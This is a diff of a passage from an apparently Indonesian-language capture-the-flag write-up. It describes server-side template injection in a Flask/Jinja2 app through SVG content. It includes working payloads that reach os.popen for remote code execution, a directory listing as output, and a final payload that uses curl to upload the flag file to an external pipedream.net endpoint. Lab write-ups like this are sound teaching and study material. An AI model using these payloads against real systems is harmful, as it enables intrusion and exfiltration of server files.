@@ -1346,17 +1346,17 @@ svg
 
 Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os module python yaitu `os.popen()` untuk mendapatkan RCE.
 
-```html
+```py
 <svg>
     <image>{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}</image>
 </svg>
 ```
 
-Sebelumnya menggunakan `[]` dll, tetapi gagal. Dan mencari-cari payload diinternet `(Internal Server Error)`, didapatkan menggunakan `config` dan berhasil.
+Sebelumnya menggunakan `[]` dll, tetapi gagal `(Internal Server Error)`. Dan mencari-cari payload diinternet, didapatkan menggunakan `config` dan berhasil.
 
 ```html
 svg 
-     <class 'str'><br><br><br>image total 84
+<class 'str'><br><br><br>image total 84
 drwxr-xr-x   1 root root 4096 Aug 28 02:18 .
 drwxr-xr-x   1 root root 4096 Aug 28 02:18 ..
 -rwxr-xr-x   1 root root    0 Aug 28 02:18 .dockerenv
@@ -1382,7 +1382,7 @@ dr-xr-xr-x  13 root root    0 Aug 28 02:21 sys
 drwxrwxrwt   1 root root 4096 Aug 28 03:43 tmp
 drwxr-xr-x   1 root root 4096 Aug  3 07:00 usr
 drwxr-xr-x   1 root root 4096 Aug  3 07:00 var
- <class 'str'><br><br><br>
+<class 'str'><br><br><br>
 ```
 
 Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`. Ternyata kita tidak bisa stdout pada website.
@@ -1391,7 +1391,7 @@ Lalu, dilakukan upload file flag ke server. Pertama, dengan membuat endpoint req
 
 Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payloadnya.
 
-```html
+```py
 <svg>
     <image>{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}</image>
 </svg>
